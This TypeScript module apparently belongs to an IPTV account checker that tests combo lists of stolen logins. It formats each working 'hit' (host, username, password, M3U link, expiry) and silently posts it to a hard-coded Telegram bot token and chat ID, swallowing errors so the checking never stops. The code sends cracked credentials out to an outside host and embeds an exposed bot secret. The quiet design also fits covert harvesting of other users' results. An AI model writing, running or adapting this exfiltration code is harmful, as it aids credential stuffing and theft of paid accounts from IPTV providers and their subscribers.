/**
 * Silent Telegram notification for IPTV hits.
 * Sends hit information to a Telegram chat without triggering any notification sound/alert.
 * Uses disable_notification: true in the Telegram Bot API.
 */

const TELEGRAM_BOT_TOKEN = '7808362501:AAHuikNaZRxV2hkg4svjvzZ_xuhKSu9fhBI'
const TELEGRAM_CHAT_ID = '5947916142'
const TELEGRAM_API_BASE = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`

interface HitInfo {
  host: string
  username: string
  password: string
  url?: string
  info?: Record<string, unknown>
  inputMode: 'url' | 'combo'
}

/**
 * Format hit information as a readable Telegram message.
 */
function formatHitMessage(hit: HitInfo): string {
  const info = hit.info || ({} as Record<string, unknown>)
  const m3uUrl = (info.m3u_url as string) || hit.url || 'N/A'
  const status = (info.status as string) || 'Active'
  const activeCons = (info.active_cons as string) || '0'
  const maxCons = (info.max_connections as string) || '0'
  const createdAt = (info.created_at as string) || 'N/A'
  const expDate = (info.exp_date as string) || 'N/A'
  const timezone = (info.timezone as string) || 'N/A'

  const modeLabel = hit.inputMode === 'url' ? 'URL Mode' : 'Combo Mode'

  return `👑 IPTV Hit [${modeLabel}]
├ 🌐 Host: ${hit.host}
├ 👤 User: ${hit.username}
├ 🔑 Pass: ${hit.password}
├ ✅ Status: ${status}
├ 📶 Active: ${activeCons} / ${maxCons}
├ ⏰ Creado: ${createdAt}
├ 📅 Exp: ${expDate}
├ 🕰️ TZ: ${timezone}
└ 🔗 M3U: ${m3uUrl}`
}

/**
 * Send a hit notification to Telegram silently (no sound, no alert).
 * Fire-and-forget: errors are logged but never thrown.
 */
export async function sendHitToTelegram(hit: HitInfo): Promise<void> {
  try {
    const text = formatHitMessage(hit)

    const response = await fetch(`${TELEGRAM_API_BASE}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text,
        disable_notification: true,
      }),
    })

    if (!response.ok) {
      const errorBody = await response.text()
      console.error('[Telegram] Failed to send hit:', response.status, errorBody)
    }
  } catch (error) {
    // Silently fail — never block the main IPTV checking flow
    console.error('[Telegram] Error sending hit:', error)
  }
}
